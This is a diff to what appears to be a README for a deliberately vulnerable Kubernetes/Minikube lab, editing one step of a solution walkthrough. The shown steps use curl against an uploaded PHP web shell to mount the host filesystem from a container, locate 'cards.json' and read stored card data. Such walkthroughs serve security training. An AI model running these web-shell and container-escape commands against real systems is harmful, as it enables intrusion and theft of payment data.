@@ -39,7 +39,7 @@ Payments processing microservice. Completely protected ;).
       ?>
       ```
   2. Create temporary directory for host file system `curl http://192.168.99.100/upload/fe84f884761716f9e641479e992c4c6f.php?cmd=mkdir%20/tmp/host`
-  3. Mount host's file system (`sda1` in my case but could vary) `curl http://192.168.99.100/upload/fe84f884761716f9e641479e992c4c6f.php?cmd=mount%20/dev/sda1%20/tmp/host`
+  3. Mount host's file system (usually `sda1` when Minikube is running on Mac / `/dev/vda1` on Linux) `curl http://192.168.99.100/upload/fe84f884761716f9e641479e992c4c6f.php?cmd=mount%20/dev/sda1%20/tmp/host`
   4. Find file `cards.json` in hosts filesystem `curl http://192.168.99.100/upload/fe84f884761716f9e641479e992c4c6f.php?cmd=find%20/tmp/host%20-name%20"cards.json"`
   5. Get stored cards `curl http://192.168.99.100/upload/fe84f884761716f9e641479e992c4c6f.php?cmd=cat%20<👆>`
 </details>
